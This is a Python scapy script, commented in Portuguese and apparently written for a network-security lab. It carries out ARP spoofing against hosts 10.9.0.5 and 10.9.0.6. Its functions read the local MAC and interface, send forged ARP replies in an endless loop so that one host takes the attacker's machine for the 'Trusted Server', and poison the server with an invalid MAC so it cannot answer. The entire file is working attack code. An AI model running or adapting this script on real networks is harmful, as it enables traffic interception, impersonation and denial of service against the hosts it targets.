#!/usr/bin/python3

import scapy.all as scapy
import subprocess

# Funcao que pega o endereco MAC local pra enviar no pacote ARP
def get_localmac():
   result = subprocess.run("ifconfig -a | sed '4!d' | cut -b 15-31", stdout=subprocess.PIPE, shell=True)
   return result.stdout.decode().strip("\n")

# Pega interface de envio, que é a primeira
def get_iface():
   result = subprocess.run("ifconfig -a | sed '1!d' | cut -d ':' -f1", stdout=subprocess.PIPE, shell=True)
   return result.stdout.decode().strip("\n")

# Vamos mandar um pacote para a vitima dizendo que o IP que queremos forjar tem nosso MAC
def spoof(mac, spoofed_src, dest):
   pkt=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dest, hwsrc=mac, psrc=spoofed_src)
   scapy.sendp(pkt, iface=get_iface(), verbose=False)

# Função com loop principal que faz arpspoofing, ou seja, mandar pacotes arp nõa requisitados
# para as outras maquinas. Nesse caso dizemos ao 10.9.0.5 que somos o 10.9.0.6 e 
# dizemos ao 10.9.0.6 que o 10.9.0.5 é um MAC invalido, assim o Trusted Server não consegue responder nada
def arpspoofing():
   # Cria entrada na tabela com endereço MAC invalido pro 10.9.0.6, evitando que repassemos pacotes pra ele
   subprocess.run(args="arp -s 10.9.0.6 ff:ff:ff:ff:ff:aa", shell=True)
   mac = get_localmac()
   while True:
      spoof(mac, "10.9.0.6", "10.9.0.5")
      spoof("ff:ff:ff:ff:ff:aa", "10.9.0.5", "10.9.0.6")